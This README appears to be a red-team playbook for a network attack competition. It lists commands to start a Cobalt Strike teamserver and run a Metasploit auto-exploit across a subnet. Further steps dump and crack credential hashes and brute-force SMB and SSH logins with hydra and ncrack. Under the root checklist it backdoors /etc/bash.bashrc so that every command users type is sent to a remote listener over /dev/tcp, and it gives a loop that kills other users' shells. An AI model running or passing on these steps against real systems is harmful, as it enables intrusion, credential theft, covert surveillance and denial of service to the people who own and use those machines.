# 67-CW-Challenge

# TODO
1. Figure out what services we would like to host and get them configured 
2. Assign tasks 
3. Assign positions
4. ???
5. Profit

# Checklist 
0. cd in the `67-CW-Challenge` folder
1. Setup teamserver on box using `./CobaltStrike/teamserver IP 33NWSIsTheBest ./CobaltStrike/cobalt.profile`
2. Run cobalt strike using `./CobaltStrike/cobaltstrike`  
2.1. Ensure that a reverse HTTP listener exists called "listener"   
3. Run `msfconsole`
4. `setg LHOST 192.168.10.225`
5. `setg RHOSTS 192.168.10.0/24`
6. `resource ./Metasploit/auto-exploit.rc`
7. In cobaltstrike script console window, type `creds`
8. Run `mkdir scans; bash scans.sh`
9. Run `cat creds.txt | cut -d":" -f2 | sed 's/ //g' > hashes.txt`
9. Run `cat creds.txt | cut -d":" -f1 | sed 's/ //g' > users.txt`
10. Upload hashes to hashkiller
11. Copy results to `hashkiller.txt`
11.1. Run `cat hashkiller.txt | grep -v "No Match" | cut -d" " -f3 | sed 's/ //g' > passwords.txt` 
12. Run `python3 user-pass.py`  
13. Run `hydra -C user-pass.txt -M ./scans/445_scan.txt smb | tee smb_results.txt`  
13.1. Run `hydra -C user-pass.txt -M ./scans/22_scan.txt ssh | tee ssh_results.txt`  
14. Run `hydra -L users.txt -P passwords.txt -M ./scans/445_scan.txt smb | tee results.txt`
14.1. Run `hydra -L users.txt -P passwords.txt -M ./scans/22_scan.txt ssh | tee results.txt`
14.2 Run `ncrack -iL scans/445_scan.txt --pairwise -U users.txt -P passwords.txt -p smb`
15. Run `cat *results.txt | grep login: > valid_creds.txt`

# Linux checklists
## When user
## When root
0. See if there is a world baschrc `ls -al /etc/bash.bashrc`  
0.1. If there is, `vim /etc/bash.bashrc` and add `export PROMPT_COMMAND='RETRN_VAL=$?;echo "$(hostname -I)- $(whoami) [$$]: $(history 1 | sed "s/^[ ]*[0-9]\+[ ]*//" ) [$RETRN_VAL]" > /dev/tcp/10.0.8.2/1337'`   
0.2. On your local computer, setup `ncat -lk 1337 | tee log.txt`  
0.3. If there isn't.  
0.4. while true; do test=$$; ps awux | grep bash | grep -v $test | grep -v grep | awk '{print $2 }' | xargs kill -9 ; sleep 10 ; done
